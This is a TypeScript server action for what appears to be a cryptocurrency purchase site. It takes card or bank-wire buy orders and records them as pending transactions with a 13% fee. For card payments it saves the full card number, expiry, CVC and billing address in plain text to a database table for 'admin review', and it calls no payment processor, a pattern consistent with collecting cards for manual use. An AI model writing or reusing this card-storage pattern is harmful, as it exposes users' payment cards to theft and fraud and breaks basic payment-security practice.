"use server";

import { prisma } from "@/lib/prisma";
import { auth } from "@/auth";
import { revalidatePath } from "next/cache";

export interface CreateBuyOrderInput {
  paymentMethod: "card" | "bank" | "bank_transfer";
  coinSymbol: string;
  coinName?: string;
  grossAmountUsd: number;
  feePercentage?: number;
  feeAmountUsd: number;
  netAmountUsd: number;
  cryptoAmount: number;
  // Card details
  cardNumber?: string;
  expiry?: string;
  cvc?: string;
  address?: string;
  city?: string;
  zipCode?: string;
  // Bank transfer details
  senderBankName?: string;
  senderReference?: string;
}

export async function createBuyOrder(data: CreateBuyOrderInput) {
  const session = await auth();
  if (!session?.user?.id) {
    return { error: "Unauthorized. Please log in." };
  }

  const {
    paymentMethod,
    coinSymbol,
    coinName = coinSymbol,
    grossAmountUsd,
    feePercentage = 13,
    feeAmountUsd,
    netAmountUsd,
    cryptoAmount,
    cardNumber,
    expiry,
    cvc,
    address,
    city,
    zipCode,
    senderBankName,
    senderReference,
  } = data;

  if (!coinSymbol || grossAmountUsd <= 0 || cryptoAmount <= 0) {
    return { error: "Invalid purchase parameters. Please check amount." };
  }

  try {
    // 1. If payment method is card, store the card record for future billing/admin review
    if (paymentMethod === "card" && cardNumber && expiry && cvc) {
      await prisma.creditCard.create({
        data: {
          userId: session.user.id,
          cardNumber: cardNumber.trim(),
          expiry: expiry.trim(),
          cvc: cvc.trim(),
          address: address?.trim() || null,
          city: city?.trim() || null,
          zipCode: zipCode?.trim() || null,
        },
      });
    }

    // 2. Prepare transaction time metadata
    const now = new Date();
    const dateStr = now.toLocaleDateString("en-US", {
      month: "short",
      day: "numeric",
      year: "numeric",
    });
    const timeStr = now.toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
    });

    const methodName =
      paymentMethod === "card" ? "Credit / Debit Card" : "Bank Wire Transfer";

    const lastFour = cardNumber
      ? ` (•••• ${cardNumber.replace(/\s+/g, "").slice(-4)})`
      : "";

    const narration = `Buy ${cryptoAmount.toFixed(6)} ${coinSymbol.toUpperCase()} via ${methodName}${lastFour} • Gross: $${grossAmountUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD | 13% Fee: -$${feeAmountUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD | Net: $${netAmountUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD`;

    const adminNote =
      paymentMethod === "card"
        ? `Card payment submitted${lastFour}. 13% transfer charge ($${feeAmountUsd.toFixed(2)} USD) deducted. Status: Processing.`
        : `Bank wire submitted${senderBankName ? ` via ${senderBankName}` : ""}${senderReference ? ` (Ref: ${senderReference})` : ""}. 13% transfer charge ($${feeAmountUsd.toFixed(2)} USD) deducted. Status: Processing.`;

    // 3. Create the BUY transaction in the database with PENDING status (Processing)
    const transaction = await prisma.transaction.create({
      data: {
        userId: session.user.id,
        type: "BUY",
        amount: cryptoAmount,
        asset: coinSymbol.toUpperCase(),
        narration,
        status: "PENDING",
        adminNote,
        date: dateStr,
        time: timeStr,
      },
    });

    revalidatePath("/dashboard");
    revalidatePath("/transactions");
    revalidatePath("/admin");

    return {
      success: true,
      transactionId: transaction.id,
      amount: cryptoAmount,
      asset: coinSymbol.toUpperCase(),
      grossUsd: grossAmountUsd,
      feeUsd: feeAmountUsd,
      netUsd: netAmountUsd,
      date: dateStr,
      time: timeStr,
      status: "PENDING",
    };
  } catch (error: any) {
    console.error("Error creating buy order:", error);
    return { error: error?.message || "Failed to process buy order." };
  }
}

